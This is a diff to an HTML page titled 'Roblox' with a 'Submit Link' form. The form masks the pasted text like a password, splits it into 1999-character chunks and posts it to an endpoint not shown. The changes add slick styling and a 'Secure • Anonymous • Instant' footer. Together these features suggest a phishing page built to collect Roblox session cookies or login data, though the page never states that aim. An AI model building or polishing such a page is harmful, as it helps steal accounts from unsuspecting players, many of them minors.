@@ -1,42 +1,119 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Roblox</title>
+
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      background-color: #f4f4f4;
+    * {
+      box-sizing: border-box;
     }
 
-    input, textarea, button {
-      padding: 10px;
-      margin: 5px;
-      font-size: 16px;
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      height: 100vh;
+      background: linear-gradient(135deg, #141e30, #243b55);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(10px);
+      border-radius: 16px;
+      padding: 30px;
+      width: 360px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+      animation: fadeIn 0.8s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      letter-spacing: 1px;
     }
 
     textarea {
-      width: 300px;
-      height: 100px;
+      width: 100%;
+      height: 110px;
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      outline: none;
       resize: none;
+      font-size: 15px;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
 
-      /* 👇 makes text show as dots */
-      -webkit-text-security: disc; /* Chrome, Edge, Safari */
-      -moz-text-security: disc;    /* Firefox */
+      /* hide text like password */
+      -webkit-text-security: disc;
+      -moz-text-security: disc;
+    }
+
+    textarea:focus {
+      transform: scale(1.02);
+      box-shadow: 0 0 0 2px rgba(0, 150, 255, 0.6);
+    }
+
+    button {
+      width: 100%;
+      margin-top: 15px;
+      padding: 12px;
+      border-radius: 12px;
+      border: none;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      background: linear-gradient(135deg, #00c6ff, #0072ff);
+      color: white;
+      transition: all 0.25s ease;
+    }
+
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 25px rgba(0, 114, 255, 0.6);
+    }
+
+    button:active {
+      transform: translateY(0);
+      box-shadow: 0 6px 12px rgba(0,0,0,0.3);
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      opacity: 0.6;
+      margin-top: 12px;
     }
   </style>
 </head>
 <body>
 
-  <h2>Submit Link</h2>
-  <textarea id="message" placeholder="Type your message here"></textarea>
-  <button onclick="sendMessage()">Send</button>
+  <div class="card">
+    <h2>Submit Link</h2>
+
+    <textarea id="message" placeholder="Type your message here"></textarea>
+
+    <button onclick="sendMessage()">Send</button>
+
+    <div class="footer">
+      Secure • Anonymous • Instant
+    </div>
+  </div>
 
   <script>
     const MAX_LENGTH = 1999;
@@ -64,12 +141,12 @@
           });
 
           if (!response.ok) {
-            alert("Failed to send message chunk.");
+            alert("Failed to send message.");
             return;
           }
         }
 
-        alert("Message sent in " + chunks.length + " parts!");
+        alert("Message sent!");
         document.getElementById('message').value = "";
       } catch (error) {
         alert("Error: " + error);
